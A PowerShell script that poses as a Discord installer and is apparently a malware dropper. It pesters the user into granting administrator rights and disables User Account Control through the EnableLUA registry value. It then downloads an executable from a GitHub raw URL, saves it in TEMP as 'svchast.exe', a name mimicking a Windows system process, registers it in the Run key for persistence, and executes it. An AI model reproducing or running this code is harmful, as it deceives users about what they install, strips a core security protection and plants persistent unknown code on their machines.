$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')

if (-not $isAdmin) {
    while ($true) {
        Write-Host "Administrator permission is required!"
        $confirm = Read-Host "To run as administrator, please enter (Y/N):"
        if ($confirm -eq 'Y' -or $confirm -eq 'y') {
            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        Write-Host "You didn’t click Yes. It is being asked again..."
        Start-Sleep -Seconds 1
    }
}

Write-Host "Discord installation is starting..."

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 0 | Out-Null

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://raw.githubusercontent.com/stenehzin/uac/main/setup.exe'
$TempPath = $env:TEMP
$FilePath = Join-Path $TempPath 'svchast.exe'

if (Test-Path $FilePath) {
    Write-Host "Discord is already installed! Skipping installation."
    exit
}

Write-Host "Downloading: $DownloadURL"

try {
    Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
    Write-Host "Download completed: $FilePath"
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "DiscordSetup" /t REG_SZ /d "`"$FilePath`"" /f | Out-Null
    
    Write-Host "Starting installation..."
    Start-Process -FilePath $FilePath -Wait
    Write-Host "Installation completed!"
} catch {
    Write-Host "Error: $_"
}

Write-Host "Process completed."
Read-Host "Press Enter to exit..."